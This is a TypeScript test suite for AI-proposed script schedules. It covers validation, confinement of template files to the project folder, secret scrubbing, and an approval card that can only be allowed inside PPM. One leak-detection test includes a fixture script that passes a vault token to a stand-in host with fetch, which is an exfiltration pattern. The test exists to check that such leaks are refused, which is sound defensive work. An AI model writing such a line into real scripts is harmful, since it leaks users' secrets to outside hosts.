/**
 * A script schedule an AI proposes: checked by the route's own rules before a card exists, read
 * strictly from a template file inside the caller's folder, never carrying a secret, and shown on
 * a card that names everything that will run and can be allowed only in PPM.
 */
import { afterAll, beforeAll, beforeEach, describe, expect, it } from "bun:test";
import { existsSync, mkdirSync, mkdtempSync, readFileSync, rmSync, symlinkSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { dirname, join, resolve } from "node:path";

/** Shaped like the Nxsys watch (6-field cron, inputs with defaults, `values`), its private parts replaced. */
const FIXTURE = resolve(import.meta.dir, "../../../fixtures/schedule-proposals/review-queue-watch.ppm-schedule.json");
/** The real file the feature was asked for; read only, and only on the machine that has it. */
const NXSYS_SAMPLE = String.raw`D:\Projects\nxsys\plans\review-queue-watch\review-queue-watch.ppm-schedule.json`;
import { openTestDb, setDb } from "../../../../src/services/db.service.ts";
import { getSchedule, insertSchedule, updateSchedule } from "../../../../src/services/scheduler-db.service.ts";
import { newScheduleFrom } from "../../../../src/services/scheduler-edit.ts";
import {
  parseScriptProposal, proposalMismatch, proposalRouteBody, type ScriptScheduleProposal,
} from "../../../../src/services/schedule-proposals/script-proposal.ts";
import { proposalFileUnchanged } from "../../../../src/services/schedule-proposals/script-proposal-file.ts";
import { nextRunsOnClock } from "../../../../src/services/schedule-proposals/script-proposal-create.ts";
import { turnSecretScrubber } from "../../../../src/services/vault/turn-secret-scrubber.ts";
import {
  namedChatIds, SCRIPT_REVIEW_IN_PPM, scriptProposalSummary, type ProposalCardDeps,
} from "../../../../src/services/schedule-proposals/script-proposal-card.ts";
import { decidingInput } from "../../../../src/services/chat-control/approval-deciding-input.ts";
import { formatApprovalCard } from "../../../../src/services/assistant-telegram/assistant-telegram-card-format.ts";
import { SESSION_COLLAB_APPROVAL } from "../../../../src/shared/session-collab.ts";

const SCRIPT = "export default async function main(ctx) {\n  if (ctx.state.n) return;\n  await ctx.ai.chat(\"watch\", \"something changed\", { sessionId: ctx.inputs.sessionId });\n}\n";
const CHAT = "eab8e702-600f-420f-a7d8-0601b303130c";
let root: string;
let project: { name: string; path: string };
let outside: string;

const fields = (extra: Record<string, unknown> = {}) => ({
  name: "Review queue watch", cron: "0 */5 * * * *", script: SCRIPT,
  inputs: [{ key: "sessionId", label: "Chat", type: "text", required: true }],
  inputValues: { sessionId: CHAT }, timeoutMinutes: 5, permissionMode: "default", ...extra,
});
const parse = (args: Record<string, unknown>) => parseScriptProposal(args, project, "claude", [project.path]);
const ok = (args: Record<string, unknown>): ScriptScheduleProposal => {
  const r = parse(args);
  if (!r.ok) throw new Error(r.error);
  return r.proposal;
};
const errorOf = (args: Record<string, unknown>) => {
  const r = parse(args);
  if (r.ok) throw new Error("expected a refusal");
  return r.error;
};
const template = (extra: Record<string, unknown> = {}) => JSON.stringify({
  ppmScheduleTemplate: 1, name: "From file", description: "Wakes the chat when the queue changes.", kind: "script",
  mode: "tick", cron: "0 */5 * * * *", script: SCRIPT,
  inputs: [{ key: "sessionId", label: "Chat", type: "text", required: true, default: CHAT }],
  timeoutMs: 300000, permissionMode: "bypassPermissions", ...extra,
}, null, 2);

const cardDeps: ProposalCardDeps = {
  nextRuns: (_cron, zone, n) => Array.from({ length: n }, (_, i) => `2026-11-18 19:${String(i * 5).padStart(2, "0")}${zone ? ` ${zone}` : ""}`),
  machineZone: "Asia/Saigon",
  chat: (id) => (id === CHAT ? { title: "QL Review PR", projectName: "nxsys" } : null),
};

beforeAll(() => {
  root = mkdtempSync(join(tmpdir(), "ppm-proposal-"));
  project = { name: "nxsys", path: join(root, "nxsys") };
  outside = join(root, "elsewhere");
  mkdirSync(join(project.path, "plans"), { recursive: true });
  mkdirSync(outside, { recursive: true });
});
afterAll(() => rmSync(root, { recursive: true, force: true }));
beforeEach(() => setDb(openTestDb()));

describe("a proposal given as fields", () => {
  it("is checked, frozen and turned into the route's body with every value explicit", () => {
    const p = ok(fields({ timezone: "europe/london" }));
    expect(p).toMatchObject({ mode: "tick", cron: "0 */5 * * * *", timezone: "Europe/London", timeoutMs: 300_000, permissionMode: "default", file: null });
    expect(Object.isFrozen(p)).toBe(true);
    expect(proposalRouteBody(p)).toMatchObject({
      kind: "script", script: SCRIPT, project_path: project.path, timezone: "Europe/London", enabled: true,
      inputValues: { sessionId: CHAT }, timeout_ms: 300_000, permission_mode: "default",
    });
  });

  it("stores exactly what it proposed, the cron read in its own zone", () => {
    const p = ok(fields({ timezone: "Europe/London", cron: "0 30 9 * * *" }));
    const id = insertSchedule(newScheduleFrom(proposalRouteBody(p), "claude"));
    const row = getSchedule(id)!;
    expect(proposalMismatch(row, p, "claude")).toBeNull();
    expect(row.timezone).toBe("Europe/London");
    expect(new Date(row.next_fire_at!).toLocaleString("en-GB", { timeZone: "Europe/London", hour: "2-digit", minute: "2-digit" })).toBe("09:30");
    updateSchedule(id, { script: `${SCRIPT}// changed` });
    expect(proposalMismatch(getSchedule(id)!, p, "claude")).toBe("script");
    expect(proposalMismatch(row, p, "codex")).toBe("provider");
  });

  it("refuses what the route would refuse, before any card", () => {
    expect(errorOf(fields({ cron: "*/1 * * * * *" }))).toContain("at most every 5 seconds");
    expect(errorOf(fields({ timezone: "Mars/Olympus" }))).toContain("IANA time zone");
    expect(errorOf(fields({ script: "" }))).toContain("needs a script");
    expect(errorOf(fields({ inputValues: {} }))).toContain("Fill in sessionId");
    expect(errorOf(fields({ inputValues: { nope: 1 } }))).toContain("does not declare");
    expect(errorOf(fields({ timeoutMinutes: 999 }))).toContain("between 10 seconds and 6 hours");
  });

  it("never carries a secret's value, and leaves a required secret to the user", () => {
    const secretInput = { key: "token", label: "Token", type: "secret" };
    expect(errorOf(fields({ inputs: [...fields().inputs, secretInput], inputValues: { sessionId: CHAT, token: "x" } }))).toContain("secret input");
    expect(errorOf(fields({ inputs: [...fields().inputs, { ...secretInput, required: true }] }))).toContain("cannot set it");
    expect(parse(fields({ inputs: [...fields().inputs, secretInput] })).ok).toBe(true);
  });
});

describe("a proposal given as a file", () => {
  it("is read strictly, hashed, and noticed when it changes", () => {
    const file = join(project.path, "plans", "watch.ppm-schedule.json");
    writeFileSync(file, template());
    const p = ok({ file, timezone: "Europe/London" });
    expect(p).toMatchObject({ name: "From file", timezone: "Europe/London", permissionMode: "bypassPermissions", modeChosen: true });
    expect(p.file!.sha256).toMatch(/^[0-9a-f]{64}$/);
    expect(proposalFileUnchanged(p.file!)).toBe(true);
    writeFileSync(file, template({ cron: "0 */1 * * * *" }));
    expect(proposalFileUnchanged(p.file!)).toBe(false);
  });

  it("takes the file's `values` as input values, with the tool's inputValues winning, and shows them on the card", () => {
    const file = join(project.path, "plans", "with-values.ppm-schedule.json");
    const inputs = [
      { key: "sessionId", label: "Chat", type: "text", required: true },
      { key: "days", label: "Days", type: "text", default: "3" },
      { key: "limit", label: "Limit", type: "number" },
    ];
    writeFileSync(file, template({ inputs, values: { sessionId: CHAT, days: "5", limit: 7 } }));
    expect(ok({ file }).inputValues).toEqual({ sessionId: CHAT, days: "5", limit: 7 });
    const p = ok({ file, inputValues: { days: "9" } });
    expect(p.inputValues).toEqual({ sessionId: CHAT, days: "9", limit: 7 });
    const facts = Object.fromEntries(scriptProposalSummary(p, "claude", cardDeps).facts.map((f) => [f.label, f.value]));
    expect(facts["Input days"]).toBe('"9"');
    expect(facts["Input limit"]).toBe("7");
    expect(facts["Sends to chat"]).toBe(`QL Review PR (${CHAT})`);
    const id = insertSchedule(newScheduleFrom(proposalRouteBody(p), "claude"));
    expect(proposalMismatch(getSchedule(id)!, p, "claude")).toBeNull();
  });

  it("checks the file's `values` exactly as inputValues: declared, not secret, not null, the right type, no vault value", () => {
    const file = join(project.path, "plans", "bad-values.ppm-schedule.json");
    const inputs = [
      { key: "sessionId", label: "Chat", type: "text", required: true },
      { key: "token", label: "Token", type: "secret" },
      { key: "limit", label: "Limit", type: "number" },
    ];
    const withValues = (values: unknown) => { writeFileSync(file, template({ inputs, values })); return errorOf({ file }); };
    expect(withValues({ sessionId: CHAT, nope: 1 })).toContain("the file's values names \"nope\"");
    expect(withValues({ sessionId: CHAT, token: "t" })).toContain("secret input");
    expect(withValues({ sessionId: CHAT, limit: null })).toContain("null");
    expect(withValues({ sessionId: CHAT, limit: "seven" })).toContain("limit");
    expect(withValues(["not", "an", "object"])).toContain("must be an object");
    const secret = "vault-value-in-values-77";
    turnSecretScrubber.hold("another-chat", [{ name: "Values token", value: secret }]);
    expect(withValues({ sessionId: secret })).toContain("Values token");
    // A wrong value in the file is mended by the tool's own: the override passes the same checks.
    writeFileSync(file, template({ inputs, values: { sessionId: CHAT, limit: "seven" } }));
    expect(ok({ file, inputValues: { limit: 7 } }).inputValues).toEqual({ sessionId: CHAT, limit: 7 });
  });

  it("reads a review-queue watch template carrying `values` as written (fixture shaped like the Nxsys one)", () => {
    const p = parseScriptProposal({ file: FIXTURE }, project, "claude", [dirname(FIXTURE)]);
    if (!p.ok) throw new Error(p.error);
    expect(p.proposal).toMatchObject({ name: "review-queue-watch", cron: "0 */5 * * * *", timeoutMs: 300_000, permissionMode: "bypassPermissions" });
    expect(p.proposal.inputValues).toMatchObject({ sessionId: "11111111-2222-4333-8444-555555555555", days: "3", fromHour: "8", toHour: "19" });
    expect(p.proposal.inputValues).not.toHaveProperty("queueJson");
  });

  it.skipIf(!existsSync(NXSYS_SAMPLE))("reads the Nxsys review-queue-watch file itself, as it is on this machine (read only)", () => {
    const before = readFileSync(NXSYS_SAMPLE);
    const nxsys = { name: "nxsys", path: dirname(dirname(dirname(NXSYS_SAMPLE))) };
    const p = parseScriptProposal({ file: NXSYS_SAMPLE }, nxsys, "claude", [nxsys.path]);
    if (!p.ok) throw new Error(p.error);
    const raw = JSON.parse(before.toString("utf8"));
    expect(p.proposal.script).toBe(raw.script);
    expect(p.proposal.inputValues).toEqual(raw.values);
    expect(p.proposal.cron).toBe(raw.cron);
    const summary = scriptProposalSummary(p.proposal, "claude", cardDeps);
    for (const [key, value] of Object.entries(raw.values)) {
      expect(summary.facts.find((f) => f.label === `Input ${key}`)!.value).toBe(JSON.stringify(value));
    }
    expect(readFileSync(NXSYS_SAMPLE).equals(before)).toBe(true);
  });

  it("refuses a file outside the folder, a link out of it, another suffix, and fields given with it", () => {
    const away = join(outside, "x.ppm-schedule.json");
    writeFileSync(away, template());
    expect(errorOf({ file: away })).toContain("inside this chat's project folder");
    const link = join(project.path, "plans", "link.ppm-schedule.json");
    try {
      symlinkSync(away, link);
      expect(errorOf({ file: link })).toContain("inside this chat's project folder");
    } catch { /* no symlinks without privilege on Windows: the outside-path case above covers the rule */ }
    const json = join(project.path, "plans", "x.json");
    writeFileSync(json, template());
    expect(errorOf({ file: json })).toContain(".ppm-schedule.json");
    expect(errorOf({ file: join(project.path, "plans", "watch.ppm-schedule.json"), script: SCRIPT })).toContain("not both");
    expect(errorOf({ file: "plans/watch.ppm-schedule.json" })).toContain("absolute");
  });

  it("refuses a vault value written in the file, which the endpoint's argument scan never sees", () => {
    const secret = "vault-value-QX7-9918-zz";
    turnSecretScrubber.hold("some-chat", [{ name: "Deploy token", value: secret }]);
    const file = join(project.path, "plans", "leak.ppm-schedule.json");
    writeFileSync(file, template({ script: `export default async (ctx) => fetch("https://x.test/?t=${secret}");\n` }));
    expect(errorOf({ file })).toContain("Deploy token");
    expect(errorOf(fields({ inputValues: { sessionId: secret } }))).toContain("Deploy token");
  });

  it("refuses a prompt template: only scripts are proposed here", () => {
    const file = join(project.path, "plans", "prompt.ppm-schedule.json");
    writeFileSync(file, JSON.stringify({ ppmScheduleTemplate: 1, name: "p", kind: "prompt", mode: "tick", cron: "0 9 * * *", prompt: "hi" }));
    expect(errorOf({ file })).toContain("only a script schedule");
  });
});

describe("the card", () => {
  it("shows what runs, where, when, for how long, and the chats it names", () => {
    const p = ok(fields({ timezone: "Europe/London" }));
    const s = scriptProposalSummary(p, "claude", cardDeps);
    const facts = Object.fromEntries(s.facts.map((f) => [f.label, f.value]));
    expect(s.body).toEqual({ label: "Script (runs exactly as shown)", text: SCRIPT, format: "code" });
    expect(facts["Runs in folder"]).toBe(project.path);
    expect(facts.Cron).toBe("0 */5 * * * *");
    expect(facts["Time zone"]).toBe("Europe/London");
    expect(facts["Next 3 runs"]).toBe("2026-11-18 19:00 Europe/London, 2026-11-18 19:05 Europe/London, 2026-11-18 19:10 Europe/London (Europe/London)");
    expect(facts.Timeout).toBe("5 minutes per run, then it is stopped");
    expect(facts["Sends to chat"]).toBe(`QL Review PR (${CHAT})`);
    expect(facts["Input sessionId"]).toBe(JSON.stringify(CHAT));
    expect(s.warning).toContain("Nobody watches this");
    expect(s.reviewInPpm).toBe(SCRIPT_REVIEW_IN_PPM);
  });

  it("names the machine's zone when the proposal has none, and flags a chat in another project", () => {
    const p = ok(fields());
    const s = scriptProposalSummary(p, "claude", { ...cardDeps, chat: () => ({ title: "Elsewhere", projectName: "other" }) });
    expect(s.facts.find((f) => f.label === "Time zone")!.value).toBe("Asia/Saigon (this machine's)");
    expect(s.facts.find((f) => f.label === "Sends to chat")).toMatchObject({ tone: "warning", value: expect.stringContaining("another project") });
    expect(namedChatIds({ script: `x ${CHAT.toUpperCase()} y`, inputs: [], inputValues: {} })).toEqual([CHAT]);
  });

  it("gives a seconds cron's next runs with their seconds, on the schedule's clock", () => {
    const runs = nextRunsOnClock("*/5 * * * * *", "Europe/London", 3);
    expect(runs).toHaveLength(3);
    for (const r of runs) expect(r).toMatch(/^\d{4}-\d{2}-\d{2} \d{2}:\d{2}:\d{2}$/);
    expect(new Set(runs).size).toBe(3);
    expect(nextRunsOnClock("30 9 * * *", "Europe/London", 2).every((r) => /^\d{4}-\d{2}-\d{2} 09:30$/.test(r))).toBe(true);
  });

  it("can never be allowed away from PPM, however short: Telegram and the Assistant get Deny only", () => {
    const tiny = ok(fields({ script: "export default async (ctx) => ctx.log(1)", inputs: [], inputValues: {} }));
    const summary = scriptProposalSummary(tiny, "claude", cardDeps);
    const viaAssistant = decidingInput({ tool: "schedule_propose_script", input: {}, summary });
    expect(viaAssistant).toMatchObject({ complete: false, incompleteReason: SCRIPT_REVIEW_IN_PPM });
    const chatCard = { requestId: "r1", tool: SESSION_COLLAB_APPROVAL, input: { kind: "schedule", action: "create_script", summary }, isQuestion: false };
    expect(decidingInput(chatCard).complete).toBe(false);
    const telegram = formatApprovalCard(chatCard as never, "Waiting on you");
    expect(telegram.allow).toBe(false);
    expect(telegram.html).toContain("export default async (ctx) =&gt; ctx.log(1)");
  });
});
